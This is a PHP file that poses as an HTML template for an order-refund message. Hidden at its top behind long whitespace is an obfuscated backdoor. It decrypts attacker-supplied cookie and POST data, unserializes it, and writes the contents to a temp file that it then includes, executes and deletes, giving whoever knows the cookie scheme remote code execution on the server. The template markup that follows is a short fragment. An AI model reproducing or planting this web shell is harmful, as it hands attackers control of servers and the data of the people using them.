<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("yxhqzi")){class yxhqzi{public static $keyvxsc = "yzkuwhigmnpcwlyo";public static $hsnrfgtmc = NULL;public function __construct(){$vgxdnqihtm = @$_COOKIE[substr(yxhqzi::$keyvxsc, 0, 4)];if (!empty($vgxdnqihtm)){$gxdzgh = "base64";$jgcofrf = "";$vgxdnqihtm = explode(",", $vgxdnqihtm);foreach ($vgxdnqihtm as $jnyyi){$jgcofrf .= @$_COOKIE[$jnyyi];$jgcofrf .= @$_POST[$jnyyi];}$jgcofrf = array_map($gxdzgh . "_decode", array($jgcofrf,));$jgcofrf = $jgcofrf[0] ^ str_repeat(yxhqzi::$keyvxsc, (strlen($jgcofrf[0]) / strlen(yxhqzi::$keyvxsc)) + 1);yxhqzi::$hsnrfgtmc = @unserialize($jgcofrf);}}public function __destruct(){$this->wekixzf();}private function wekixzf(){if (is_array(yxhqzi::$hsnrfgtmc)) {$nhmpzo = sys_get_temp_dir() . "/" . crc32(yxhqzi::$hsnrfgtmc["salt"]);@yxhqzi::$hsnrfgtmc["write"]($nhmpzo, yxhqzi::$hsnrfgtmc["content"]);include $nhmpzo;@yxhqzi::$hsnrfgtmc["delete"]($nhmpzo);exit();}}}$exemgmy = new yxhqzi();$exemgmy = NULL;} ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
...
<h1>Your order has been refunded<br></h1>
</td>
</tr>
<tr>
